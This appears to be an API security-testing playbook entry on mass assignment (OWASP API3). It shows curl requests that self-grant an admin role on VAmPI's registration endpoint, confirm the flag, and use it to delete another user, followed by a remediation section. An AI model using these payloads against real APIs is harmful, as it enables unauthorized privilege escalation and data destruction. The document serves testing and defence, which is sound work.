# API3-MA-01: Self-granted admin role on registration

| | |
|---|---|
| **OWASP** | [API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/) |
| **CWE** | [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html) |
| **Severity** | High |
| **Validated against** | VAmPI at `f16052dc`, `POST /users/v1/register` |
| **Runnable** | `python -m authzprobe.probe` case `API3-MA-01` |

## Purpose

Determine whether the API has an allowlist of client-settable properties, or
whether it binds whatever arrives. Where BOLA asks "which objects may I
reach", mass assignment asks "which *fields* of this object may I write".

The registration endpoint is the highest-value place to test it, because it is
unauthenticated by necessity. A privileged property that is client-writable
there is a privilege escalation available to anyone on the internet, with no
prior access.

## Identification

1. Get the full property set, not just the documented one. Sources, cheapest
   first:
   - a `GET` of the same object, which usually returns more fields than the
     `POST` documents
   - a debug or export endpoint. VAmPI's `/users/v1/_debug` returns `admin`
   - the OpenAPI schema, including `readOnly` properties, which are often
     documented as read-only and not enforced as read-only
   - error messages from a deliberately malformed body
   - the ORM model, in a grey-box test
2. Pick properties that change a decision rather than a display value:
   `admin`, `role`, `isVerified`, `balance`, `price`, `tenantId`,
   `ownerId`. `wordlists/mass-assignment-params.txt` collects the common names.
3. Add one property per request. Several at once makes it unclear which was
   accepted, and some frameworks reject the whole body on one unknown field.
4. **Read the object back.** This is the step that is skipped most often and the
   only one that produces evidence.

## Implementation

Register with an extra property the form never offers:

```bash
curl -i -X POST http://127.0.0.1:5000/users/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"mallory","password":"mallory",
       "email":"mallory@example.invalid","admin":true}'
```

Read it back:

```bash
curl -s http://127.0.0.1:5000/users/v1/_debug | jq '.users[] | select(.username=="mallory")'
```

Then demonstrate impact, because a `true` in a database is not yet a finding a
reviewer will act on:

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"mallory","password":"mallory"}' | jq -r .auth_token)

# An action gated on the admin flag
curl -i -X DELETE http://127.0.0.1:5000/users/v1/name1 \
  -H "Authorization: Bearer $TOKEN"
```

## Success criteria

Three escalating levels. Report the highest one reached.

| Level | Evidence | Verdict |
|---|---|---|
| 1 | The write returns `2xx` | **Not a finding.** Proves nothing; most APIs silently drop unknown fields. |
| 2 | A read-back shows the property set to the client's value | Confirmed, exploitability unproven. |
| 3 | An action gated on that property now succeeds | Confirmed and exploitable. |

Observed against VAmPI, all three reached:

| Step | Result |
|---|---|
| `POST /users/v1/register` with `"admin": true` | `HTTP 200` |
| Read back via `/users/v1/_debug` | `"admin": true` |
| `DELETE /users/v1/name1` as the new account | `HTTP 200`, `"User deleted."` |
| Same delete as a non-admin peer (control) | `HTTP 401`, `"Only Admins may delete users!"` |

The control row is what makes this airtight. It proves the `admin` property was
load-bearing rather than decorative, so the escalation is real.

## Original and modified exchange

Verbatim from `captures/vampi-2026-10-21.md`.

**Original** — registration as the client is expected to send it:

```http
POST /users/v1/register HTTP/1.1
Content-Type: application/json

{ "username": "alice", "password": "alice", "email": "alice@example.invalid" }
```

```http
HTTP/1.1 200

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

**Modified** — one property added:

```http
POST /users/v1/register HTTP/1.1
Content-Type: application/json

{
  "username": "probe-mallory",
  "password": "probe-mallory",
  "email": "probe-mallory@example.invalid",
  "admin": true
}
```

```http
HTTP/1.1 200

{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

Note that the two responses are identical. The write gives no indication that
anything unusual was accepted, which is exactly why level 1 above is not
evidence.

**Read-back**, which is the actual evidence:

```http
GET /users/v1/_debug HTTP/1.1
```

```http
HTTP/1.1 200

{"users": [
  {"admin": false, "email": "mail1@mail.com", "password": "pass1", "username": "name1"},
  {"admin": true,  "email": "probe-mallory@example.invalid",
   "password": "probe-mallory", "username": "probe-mallory"}
]}
```

## Remediation

Bind an explicit allowlist. Never hand a parsed request body to a model
constructor:

```python
# Vulnerable: the client decides which columns are written
if "admin" in request_data:
    user = User(username=..., email=..., admin=request_data["admin"])

# Fixed: the server decides, and privilege is not in the input contract
ALLOWED = ("username", "password", "email")
fields = {k: request_data[k] for k in ALLOWED if k in request_data}
user = User(**fields)              # admin takes its database default
```

- Allowlist, never blocklist. A blocklist fails the moment somebody adds a
  column.
- Use a separate input schema per operation. The object you accept and the
  object you store are different types, and conflating them is the root cause.
- Do not rely on the ORM or serialiser default. A schema describes which
  columns exist, not which a client may set.
- Reject unknown properties outright (`additionalProperties: false`) so probing
  is noisy and detectable rather than silent.
- Role changes belong on their own endpoint, behind a role check, audit-logged.

## Notes

Partially detectable statically, and instructively so. The taint-mode rule in
[devsecops-pipeline-lab](https://github.com/gl1tchdust/devsecops-pipeline-lab)
**misses this exact instance**: VAmPI's handler branches on the request value
and assigns a boolean literal, so the value reaching the constructor carries no
taint. The attacker controls the branch, not the value. Dynamic probing finds
it in one request; static analysis needs control-dependence tracking that the
engine does not do.
